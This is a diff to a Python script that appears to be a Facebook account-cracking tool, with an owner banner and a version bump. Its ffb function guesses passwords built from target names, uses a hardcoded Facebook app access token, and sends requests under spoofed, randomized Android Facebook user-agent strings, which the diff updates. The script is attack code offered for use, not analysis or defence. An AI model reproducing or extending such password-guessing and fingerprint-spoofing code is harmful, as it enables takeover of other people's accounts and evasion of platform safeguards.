@@ -23,7 +23,7 @@ logo = """
 \033[1;96m------------------------------------------------\033[1;97m
 [\033[1;96m●\033[1;97m] Owner      : Sajjad Ahmad
 [\033[1;96m●\033[1;97m] Facebook   : Sajjad Ahmad
-[\033[1;96m●\033[1;97m] Version    : 0.0
+[\033[1;96m●\033[1;97m] Version    : 0.1
 [\033[1;96m●\033[1;97m] Status     : \033[1;92mFree \033[1;97m
 \033[1;96m------------------------------------------------\033[1;97m"""
 def linex():
@@ -109,7 +109,7 @@ def ffb(ids,names,passlist):
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                         accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/58.0.0.4442;FBBV/1960650;[FBAN/FB4A;FBAV/379.0.0.24.109;FBBV/389395297;FBDM/{density=3.0,width=2200,height=2480};FBLC/ru_RU;FBRV/390374938;FBCR/Amigo;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/TET-AN50;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/46.0.0.1851;FBBV/1497425;[FBAN/FB4A;FBAV/196.0.0.63;FBBV/364181765;FBDM/{density=2.25,width=1080,height=2400};FBLC/en_Qaau_US;FBRV/450082065 ;FBCR/Vi India;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3782;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                         head = {'User-Agent': ua,
                                 'Accept-Encoding': 'gzip, deflate',
                                 'Connection': 'Keep-Alive',
